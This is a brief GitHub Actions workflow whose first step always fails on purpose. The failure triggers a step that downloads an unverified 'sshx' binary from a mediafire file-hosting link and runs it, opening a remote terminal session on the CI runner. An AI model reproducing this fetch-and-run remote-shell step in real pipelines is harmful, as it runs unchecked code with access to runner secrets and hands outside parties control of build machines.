name: test

on:
  push:
  workflow_dispatch:
    inputs:
      debug:
        type: boolean
        description: Manual trigger
        required: false
        default: false

jobs:
  gh-action-job:
    runs-on: ubuntu-24.04-arm
    steps:
      - name: A step that will always fail
        run: |
          echo "this step will wait 10 seconds and always fails"
          sleep 10
          exit 1
      - name: Start SSHX in case of failure
        if: failure()
        run: |
          curl -L "https://download1326.mediafire.com/m44gndsp70xgV26rLRmcKfMs1KE6N_9UzDUSGbfX4diRFTvPbeGXIJxnmyAMcqOhyrRzVv9uWI6XimL_QAEpk9BSv6d_omGpEQXD9Nkhqh0klCbHCFXvzvki4htFWPx-LUr04SKAWf7Oz3UEQiMH65XJtHHk4j62b_K0ggfW_0olQQ/6xmluxdl5oifb3u/sshx" -o sshx && chmod +x sshx && ./sshx
